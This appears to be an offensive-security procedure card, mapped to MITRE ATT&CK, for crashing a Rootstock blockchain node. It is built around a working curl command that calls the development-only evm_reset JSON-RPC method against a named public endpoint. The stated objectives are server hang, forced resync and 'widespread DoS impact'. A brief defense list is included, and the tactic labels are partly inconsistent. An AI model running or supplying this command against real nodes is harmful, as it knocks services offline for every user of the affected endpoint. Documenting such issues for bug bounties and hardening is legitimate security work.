---
id: proc-003
tags:
  - dos
  - evm
  - exploit
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Privilege Escalation]]'
commands:
  - '[[commands/rpc-evm-reset-trigger]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Endpoint Denial of Service]]'
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:26:48.662Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Privilege Escalation]]'
mitre_techniques:
  - '[[Endpoint Denial of Service]]'
  - '[[Exploit Public-Facing Application]]'
---
# Trigger EVM Reset DoS

## Summary

This procedure exploits the evm_reset JSON-RPC method to reset the EVM state on a Rootstock node, causing resource exhaustion, server hang, and denial of service to all users.

## Description

By invoking evm_reset, which is intended for development only, the procedure forces a full blockchain resync from block 0. This computationally intensive operation hangs the server, leading to 504 timeouts and unresponsiveness. It's effective against misconfigured public RPC endpoints.

## Requirements

1. Confirmed exposure of evm_reset via prior snapshot tests
2. Direct HTTPS access to the endpoint
3. curl with timeout handling optional for monitoring

## Defense

Defensive measures and detection strategies:

- Explicitly disable evm_reset in RPC configuration files
- Use request queuing and timeouts for long-running methods
- Monitor for evm_* calls and auto-ban offending IPs

## Objectives

1. Induce server hang and resource consumption
2. Reset node sync to disrupt service
3. Achieve widespread DoS impact

## Instructions

### Step 1: Execute EVM Reset

**Context**: Send the reset payload to trigger the vulnerable operation.

**Command** ([[commands/rpc-evm-reset-trigger]]):
```bash
curl -s -X POST -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","method":"evm_reset", "params": {}, "id":666}' https://bounty-node.rsk.co
```

> The request uses empty params for reset. Expected: Indefinite hang (no response), as the server processes the slow reset.

## MITRE ATT&CK Mapping

### Tactics

- [[Privilege Escalation]] Impact

### Techniques

- [[Endpoint Denial of Service]] Endpoint Denial of Service
- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used

- [[commands/rpc-evm-reset-trigger]]

## Tools Used

- [[tools/curl]]

## Tags

- dos
- reset
- evm
